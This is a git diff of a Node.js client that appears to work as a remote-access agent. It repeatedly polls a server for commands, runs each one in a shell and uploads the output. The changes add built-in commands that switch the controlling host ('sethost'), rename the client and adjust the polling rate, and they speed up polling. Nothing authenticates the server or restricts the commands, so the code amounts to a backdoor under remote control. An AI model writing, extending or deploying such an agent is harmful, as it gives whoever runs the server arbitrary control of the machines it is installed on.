@@ -6,10 +6,8 @@ const fs = require('fs');
 
 let host = '';
 let name = 'pc';
-let active = false;
 let lastFlushTime = 0;
-let lastActiveTime = 0;
-const openLink = false;
+let flushPeriod = 30000;
 const DEBUG = true;
 
 function initHost() {
@@ -47,33 +45,88 @@ function telcmd(cmd, name){
     });
 }
 
-function result(id, cmd, res, callback) {
+function result(id, cmd, stdout, stderr, callback) {
     request.post({
         url: host + '/result',
         body: {
             id: id,
             name: name,
             cmd: cmd,
-            res: res,
+            stdout: stdout,
+            stderr: stderr,
             time: new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '')
         },
         json: true
     }, callback);
 }
 
+function build_in(cmd) {
+    if(cmd) {
+        let [matched, stdout, stderr] = [true, '', ''];
+        let args = cmd.trim().split(' ');
+        if('sethost' == args[0]) {
+            if(args.length >= 2) {
+                let newHost = args[1].trim();
+                if(newHost != host) {
+                    log('host:' + host + ' -> ' + newHost)
+                    stdout = 'successfully set host from "' + host + '" to "' + newHost + '"';
+                    host = newHost;
+                    fs.writeFileSync('host', host);
+                }
+                else {
+                    stdout = 'not changed';
+                }
+            }
+            else {
+                stderr = 'expected 2 arguments';
+            }
+        }
+        else if('setname' == args[0]) {
+            if(args.length >= 2) {
+                let newName = args[1].trim();
+                if(newName != name) {
+                    log('name:' + name + ' -> ' + newName)
+                    stdout = 'successfully set name from "' + name + '" to "' + newName + '"';
+                    name = newName;
+                    fs.writeFileSync('name', name);
+                }
+                else {
+                    stdout = 'not changed';
+                }
+            }
+            else {
+                stderr = 'expected 2 arguments';
+            }
+        }
+        else if('period' == args[0]) {
+            let period = args.length >= 2 ? parseInt(args[1].trim()) : 3000;
+            if(!isNaN(period)) {
+                period = Math.max(1000, period);
+                log('period:' + flushPeriod + ' -> ' + period)
+                stdout = 'successfully set flush period from ' + flushPeriod + ' to ' + period;
+                flushPeriod = period;
+            }
+            else {
+                stderr = 'invalid period: ' + args[1];
+            }
+        }
+        else {
+            matched = false;
+        }
+        return [matched, stdout, stderr];
+    }
+    return [false, '', ''];
+}
+
 // change name to your client name
 function flush(){
     let now = new Date().getTime();
-    if(!active && now - lastFlushTime < 60 * 1000) {
+    if(now - lastFlushTime < flushPeriod) {
         return;
     }
     // log('flush');
     lastFlushTime = now;
 
-    if(active && now - lastActiveTime > 60 * 1000) {
-        log('deactive');
-        active = false;
-    }
     get(host + '/flush?name=' + name, async function (error, response, buf) {
         if(!buf) return;
         let json = new Buffer(buf).toString();
@@ -84,28 +137,21 @@ function flush(){
             let cmd = item.cmd;
             let encoding = item.encoding ? item.encoding :'gbk';
             if(cmd){
-                log('active');
-                active = true;
+                log('> ' + cmd);
                 lastActiveTime = now;
                 // remove useless build_in
-                // if(await build_in.exec(item)){
-                //     console.log('build-in: ', cmd);
-                // }
-                log('> ' + cmd);
-                exec(cmd, {encoding: 'buffer'}, function(err, stdout, stderr) {
-                    let res = 'stdout:' + iconv.decode(stdout, encoding) 
-                        + '\nstderr:'+ iconv.decode(stderr, encoding);
-                    log(res);
-                    result(id, cmd, res);
-                });
-                // run link file automatic
-                if(openLink) {
-                    if(!cmd.endsWith('.lnk')){
-                        let res = 'stdout:' + iconv.decode(stdout, encoding) 
-                            + '\nstderr:'+ iconv.decode(stderr, encoding);
-                        log(res);
-                        result(cmd, res);
-                    }
+                let [matched, stdout, stderr] = build_in(cmd);
+                if(matched){
+                    result(id, cmd, stdout, stderr);
+                    log('build-in:\n' + stdout + '\n' + stderr);
+                }
+                else {
+                    exec(cmd, {encoding: 'buffer'}, function(err, stdoutBuf, stderrBuf) {
+                        stdout = iconv.decode(stdoutBuf, encoding) 
+                        stderr = iconv.decode(stderrBuf, encoding);
+                        result(id, cmd, stdout, stderr);
+                        log(stdout + '\n' + stderr);
+                    });
                 }
             }
         }
@@ -126,7 +172,7 @@ function resetHost() {
 
 function deamon(){
     setImmediate(flush);
-    setInterval(flush, 3000);
+    setInterval(flush, 1000);
     setInterval(resetHost, 60 * 60 * 1000);
     // setInterval(updateCode, 3 * 60 * 60 * 1000);
 }
